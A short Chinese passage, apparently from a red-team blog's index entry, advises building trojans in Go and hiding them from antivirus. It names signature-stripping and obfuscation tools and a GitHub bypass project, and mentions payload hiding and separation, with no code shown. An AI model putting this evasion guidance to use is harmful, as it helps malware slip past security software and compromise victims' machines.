对于一个web手来说，让我们手写shellcode来bypass杀软有点过分，所以或多或少需要借助已有轮子，这里推荐大家用go来生成相关的木马。 对于go生成的木马特征不是很明显，不过还是容易被识别出来，所以我们需要借助混淆、清除特征来进行隐藏。 对于已有的轮子推荐 go-strip：用来清除go编译的特征以及函数名混淆（当然，go编译的参数也可以进行初步特征清除 garble：很多人使用（在go编译的时候就会进行字节码、函数相关的混淆，过火绒应该还是没问题 web手的进一步免杀工程 通过研究已有项目进行免杀 https://github.com/safe6Sec/GolangBypassAV 常见的是静态免杀，比如隐藏图片，分离，核心都一样，隐藏特征 ","link":"https://redteamblog.icu/post/qian-tan-bypass-jin-shan-zhong-duan-an-quan-xi-tong-de-xin-lu-li-cheng/"}]}